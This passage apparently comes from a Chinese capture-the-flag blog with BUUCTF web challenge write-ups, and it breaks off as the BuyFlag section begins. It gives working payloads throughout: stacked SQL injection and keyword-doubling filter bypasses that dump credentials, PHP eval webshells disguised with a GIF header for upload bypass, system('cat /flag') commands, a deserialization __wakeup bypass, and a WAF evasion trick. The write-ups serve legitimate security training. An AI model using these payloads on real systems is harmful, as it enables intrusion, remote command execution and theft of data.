<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">1&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto<span class="hljs-built_in">_</span>increment primary key;alter table words change flag data varchar(100);<span class="hljs-params">#</span><br></code></pre></td></tr></table></figure>
<p>方法二：利用execute来执行由SQLPrepare创建的SQL语句</p>
<p>先对select * from 数字表进行十六进制编码，<code>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</code></p>
<p>payload如下：</p>
<p>这里过滤set和prepare，转换为大写即可。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">1&#x27;;SET@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE execsql from @a;execute execsql;<span class="hljs-params">#</span><br></code></pre></td></tr></table></figure>
<p>方法三：使用handler处理器</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">1&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;<span class="hljs-params">#</span><br></code></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-Http">[极客大挑战 2019]Http</h2>
<p>查看源代码，发现<code>/Secret.php</code>页面，访问报<code>It doesn't come from 'https://Sycsecret.buuoj.cn'</code>。</p>
<ol>
<li>抓包增加Referer字段，表示请求来源的页面，抓包修改；</li>
</ol>
<p>接着报<code>Please use &quot;Syclover&quot; browser</code>，</p>
<ol start="2">
<li>抓包增加User-Agent字段，表示发起请求的用户代理（浏览器）；</li>
</ol>
<p>接着报<code>No!!! you can only read this locally!!!</code>，表示只能本地访问，修改ip地址</p>
<ol start="3">
<li>抓包增加X-Forwarded-For:127.0.0.1,具体修改如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744883871408.png" srcset="/img/loading.gif" lazyload alt="1744883871408"></p>
<h2 id="极客大挑战-2019-Upload">[极客大挑战 2019]Upload</h2>
<ol>
<li>上传一句话木马<code>1.php</code>，报不是image；</li>
<li>抓包修改<code>Content-Type</code>为<code>image/jpeg</code>，报不能是php后缀;</li>
</ol>
<p>可以绕过php后缀限制又能正常执行php文件的后缀有：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">php,php3,php4,php5,phtml,pht<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>将包中的<code>filename</code>改为<code>1.phtml</code>，报不能包含<code>&lt;?'</code>,过滤了php标签；</li>
<li>修改一句话木马的php标签，改为<code>&lt;script&gt;</code>，具体如下：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&lt;script language=&quot;php&quot;&gt; eval(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST[1]); &lt;/script&gt; <br></code></pre></td></tr></table></figure>
<ol start="5">
<li>报检测到不是图片类型，添加图片头，payload如下：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">GIF89a? &lt;script language=&quot;php&quot;&gt; eval(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST[1]); &lt;/script&gt; <br></code></pre></td></tr></table></figure>
<p>具体的包如下图：上传成功！</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744903994950.png" srcset="/img/loading.gif" lazyload alt="1744903994950"></p>
<ol start="6">
<li>
<p>文件上传后的保存路劲一般在<code>url/upload/</code>目录下</p>
</li>
<li>
<p>使用蚁剑连接，<a target="_blank" rel="noopener" href="http://urlxxxx/upload/1.phtml%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81%E4%B8%BA1%EF%BC%8C%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%89%BE%E5%88%B0flag%E3%80%82">http://urlxxxx/upload/1.phtml，连接密码为1，在根目录下找到flag。</a></p>
</li>
</ol>
<h2 id="极客大挑战-2019-Knife">[极客大挑战 2019]Knife</h2>
<p>题目页面直接出现一句话木马<code>eval($_POST['Syc'])</code>：</p>
<p>方法一：使用蚁剑直接连接，在根目录中找到flag；</p>
<p>方法二：hackbar直接传送数据，首先尝试<code>Syc=phpinfo();</code>验证是否可行，第二步使用<code>Syc=system('ls /');</code>在<strong>源代码页面</strong>查看回显，后续直接使用<code>Syc=system('cat /flag')</code>读取flag。</p>
<h2 id="ACTF2020-新生赛-Upload">[ACTF2020 新生赛]Upload</h2>
<p>文件上传，仅允许上传png,jpg,gif如片（该处为前端验证）：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745033604662.png" srcset="/img/loading.gif" lazyload alt="1745033604662"></p>
<p>这里对文件后缀进行截断，转换等不能实现，因为后续会对文件名进行额外的操作，替换为一串数字。</p>
<p>绕过前端验证的方式为bp抓包修改：文件名改为<code>1.php</code></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745033808547.png" srcset="/img/loading.gif" lazyload alt="1745033808547"></p>
<p>尝试其他后缀：<code>1.phtml</code>,上传成功。后续蚁剑连接即可。</p>
<h2 id="极客大挑战-2019-BabySQL">[极客大挑战 2019]BabySQL</h2>
<p>内部查询语句应为：</p>
<p><code>select  xx,xx,xx... where username=$_GET['name'] and password=$_GET['pass']</code></p>
<ol>
<li>首先测试是字符型还是数字型：判断为字符型。</li>
</ol>
<p>usename=<code>admin'</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745121815285.png" srcset="/img/loading.gif" lazyload alt="1745121815285"></p>
<ol start="2">
<li>尝试万能密码：</li>
</ol>
<p>username=<code>admin' or 1=1#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745122359143.png" srcset="/img/loading.gif" lazyload alt="1745122359143"></p>
<p>可能是or被替换为空字符，尝试在or后加s，username=<code>admin' ors 1=1#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745122596356.png" srcset="/img/loading.gif" lazyload alt="1745122596356"></p>
<p>得到验证，or被替换为空，可以使用双写绕过。</p>
<ol start="3">
<li>判断字段数：到4报错，字段数为3</li>
</ol>
<p>username=<code>admin' oorrder bbyy 3#</code>，password=<code>admin</code></p>
<ol start="4">
<li>判断回显点：这里<strong>使用联合注入，要有回显，必须让username和password匹配不出来</strong></li>
</ol>
<p>username=<code>1' ununionion seselectlect 1,2,3#</code>，password=<code>admin</code>，<strong>这里username设为1，匹配不出来，回显1,2,3，回显点为2,3</strong>，如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745123182786.png" srcset="/img/loading.gif" lazyload alt="1745123182786"></p>
<ol start="5">
<li>查表：</li>
</ol>
<p>username=<code>1' ununionion seselectlect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745123640875.png" srcset="/img/loading.gif" lazyload alt="1745123640875"></p>
<p>可能还存在一些过滤，改为：</p>
<p>username=<code>1' ununionion seselectlect 1,group_concat(table_name),3 fromrrrr information_schema.tables where table_schema=database()#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745123732215.png" srcset="/img/loading.gif" lazyload alt="1745123732215"></p>
<p>from可能被过滤，information_schema中的or也被过滤，改为：</p>
<p>username=<code>1' ununionion seselectlect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables where table_schema=database()#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124326465.png" srcset="/img/loading.gif" lazyload alt="1745124326465"></p>
<p>where可能被过滤，改为：</p>
<p>username=<code>1' ununionion seselectlect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124381437.png" srcset="/img/loading.gif" lazyload alt="1745124381437"></p>
<ol start="6">
<li>查列名：</li>
</ol>
<p>username=<code>1' ununionion seselectlect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_schema=database() and table_name='b4bsql'#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124490071.png" srcset="/img/loading.gif" lazyload alt="1745124490071"></p>
<p>and可能被过滤，改为：</p>
<p>username=<code>1' ununionion seselectlect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name='b4bsql'#</code>，password=<code>admin</code>，回显如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124541741.png" srcset="/img/loading.gif" lazyload alt="1745124541741"></p>
<ol start="5">
<li>查数据：</li>
</ol>
<p>username=<code>1' ununionion seselectlect 1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql#</code>，password=<code>admin</code>，回显如下：注意password中的or</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124743359.png" srcset="/img/loading.gif" lazyload alt="1745124743359"></p>
<h2 id="极客大挑战-2019-PHP">[极客大挑战 2019]PHP</h2>
<ol>
<li>首先进行目录探测，在kali中安装dirsearch,使用命令如下：发现www.zip文件</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">dirsearch -u http://xxx<br>dirsearch -u http://xxx -e php  //-e指定语言<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249460688.png" srcset="/img/loading.gif" lazyload alt="1745249460688"></p>
<ol start="2">
<li>下载源码文件，发现index.php中存在反序列化入口：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249546150.png" srcset="/img/loading.gif" lazyload alt="1745249546150"></p>
<ol start="3">
<li>在class.php尝试构造name类的反序列字符串，class.php代码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里要获得flag有两个关键点，一是类属性为private，在构造反序列字符串时会在属性名前加<code>%00类名%00</code>，使用shell输出反序列化字符串%00不会显示，构造反序列化字符串的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-number">100</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>输出如图：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249804362.png" srcset="/img/loading.gif" lazyload alt="1745249804362"></p>
<p>另一个关键点，在上传反序列化字符串后进行反序列化会自动调用<code>__wakeup</code>方法，会改变我们username的值，必须绕过wakeup方法：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">条件：php5-php5.6.25；php7-php7.0.10<br><br>修改反序列化字符串中表示属性个数大于实际属性个数。<br></code></pre></td></tr></table></figure>
<p>这里php环境的条件为：满足</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249945969.png" srcset="/img/loading.gif" lazyload alt="1745249945969"></p>
<p>最终的payload为：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;<span class="hljs-comment">%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="ACTF2020-新生赛-BackupFile">[ACTF2020 新生赛]BackupFile</h2>
<ol>
<li>题目为备份文件+源码，尝试<code>/index.bak</code>，<code>/index.backup</code>，<code>/index.php-bak</code>，<code>/index.php.bak</code>，最后结果为<code>/index.php.bak</code>。</li>
</ol>
<p>常见的备份文件后缀为：bak，svn，git，使用dirsearch的命令为：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">dirsearch -u http://xxx -e bak,svn,git<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>查看代码：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li>php比较类型：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br><br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较<br></code></pre></td></tr></table></figure>
<p>这里是==弱比较，</p>
<p>弱比较：如果<strong>比较一个数字和字符串</strong>，则<strong>字符串会被转换成数字</strong>并且比较按照数字来进行；</p>
<p>字符串转数字：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">如果该字符串包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内,则会作为float来取值；<br>其余情况下，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。<br></code></pre></td></tr></table></figure>
<p>所以这里<code>$str</code>的值为123，所以传入key=123即可。</p>
<h3 id="拓展">拓展</h3>
<ol>
<li>php弱类型比较，涉及<code>md5绕过</code>，<code>json绕过</code>，<code>array_search is_array绕过</code>，<code>strcmp漏洞绕过 php -v &lt;5.3</code>，<code>switch绕过</code>。</li>
</ol>
<p>链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>
<ol start="2">
<li><code>isnumeric( )函数</code>绕过：</li>
</ol>
<p>可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">数字-&gt;非数字：<br>数值<span class="hljs-comment">%20</span><br><span class="hljs-comment">%00数值</span><br>数值<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure>
<h2 id="RoarCTF-2019-Easy-Calc">[RoarCTF 2019]Easy Calc</h2>
<ol>
<li>查看源码，发现calc.php文件，并提示设置了防火墙：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745329914638.png" srcset="/img/loading.gif" lazyload alt="1745329914638"></p>
<ol start="2">
<li>查看calc.php代码：代码执行绕过</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>代码执行，过滤了<code>''</code>，使用无参数代码执行，借助函数：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%查看当前目录：</span><br>var<span class="hljs-built_in">_</span>dump()<br>scandir()<br>这里过滤了根目录`/`,使用chr(47)代替，chr()函数返回对应 ASCII 值的字符/<br><br>构造的payload如下：<br>?num=var<span class="hljs-built_in">_</span>dump(scandir(chr(47)))<br><br><span class="hljs-comment">%读取文件</span><br>file<span class="hljs-built_in">_</span>get<span class="hljs-built_in">_</span>contents()<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>绕过防护墙，当传入num为字母时，会出现以下页面：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745330399238.png" srcset="/img/loading.gif" lazyload alt="1745330399238"></p>
<p>这里使用<strong>PHP的字符串解析特性</strong>进行绕过：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">PHP会将查询字符串（在URL或正文中）解析转换为内部<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET或<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST的关联数组。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br><br>解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）<br>例如：/?<span class="hljs-comment">%20news[id%00=42会转换为Array([news_id] =&gt; 42)。</span><br><br></code></pre></td></tr></table></figure>
<p>绕过方法：</p>
<p>因为num不可以传入字母，但是我们在num参数之前添加一个空格，这样在PHP的语言特性下会默认删除这个空格，但是WAF会因为这个空格导致检测不到num这个参数，最终导致WAF被绕过。</p>
<p>最终payload如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%查看目录</span><br>?<span class="hljs-comment">%20num=var_dump(scandir(chr(47)))</span><br><span class="hljs-comment">%读取flag</span><br>?<span class="hljs-comment">%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))或者</span><br>?<span class="hljs-comment">%20num=file_get_contents(chr(47).f1agg)</span><br></code></pre></td></tr></table></figure>
<h3 id="补充">补充</h3>
<ol>
<li>echo var_dump()如何返回结果？</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tex">var<span class="hljs-built_in">_</span>dump() 会直接输出内容到屏幕，并且它的返回值是 null。<br><br>所以 echo var<span class="hljs-built_in">_</span>dump(...) 相当于：<br><br>var<span class="hljs-built_in">_</span>dump(...) 输出了一堆调试信息。<br><br>然后 echo null —— 也就是啥也不输出。<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>echo file_get_contents()如何返回结果?</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">file<span class="hljs-built_in">_</span>get<span class="hljs-built_in">_</span>contents(...) 把文件的内容读出来,返回结果为字符串<br><br>echo 负责 输出这个字符串到页面或终端<br></code></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-BuyFlag">[极客大挑战 2019]BuyFlag</h2>
<ol>
<li>阅读源码，发现<code>/pay.php</code>页面，有一段代码如下：</li>
</ol>
